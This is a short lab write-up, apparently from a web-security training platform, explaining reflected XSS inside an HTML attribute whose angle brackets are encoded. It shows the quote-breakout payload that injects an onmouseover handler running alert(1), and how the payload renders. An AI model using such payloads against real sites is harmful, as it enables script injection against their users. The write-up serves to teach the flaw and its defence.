
#### 📄 File 2: `XSS_Reflected_Attribute_Context.md`

```markdown
# Lab: Reflected XSS into attribute with angle brackets HTML-encoded

| **Category** | Web Security / Client-Side |
| :--- | :--- |
| **Vulnerability Type** | Reflected XSS (Attribute Context) |
| **Goal** | Break out of an HTML attribute to execute JavaScript. |
| **Difficulty** | 🟢 Apprentice |
| **Status** | ✅ Solved |

## Conceptual Overview
When user input is placed inside an HTML attribute (e.g., `value="..."`), simply injecting `<script>` tags fails if angle brackets (`<>`) are encoded. However, if quotes (`"`) are not escaped, an attacker can close the attribute and inject a new event handler.

## Exploitation Steps

### Phase 1: Context Identification
Input lands inside the `value` attribute:
```html
<input type="text" value="USER_INPUT">
```
### Phase 2: The Payload (Event Handler)
We cannot use <script> tags due to encoding. Instead, we break the attribute and inject the onmouseover event.

### Payload:

Plaintext
" onmouseover="alert(1)
How it renders:

```HTML
<input type="text" value="" onmouseover="alert(1)">
```
## Execution Result
Moving the mouse over the input field triggers the malicious JavaScript.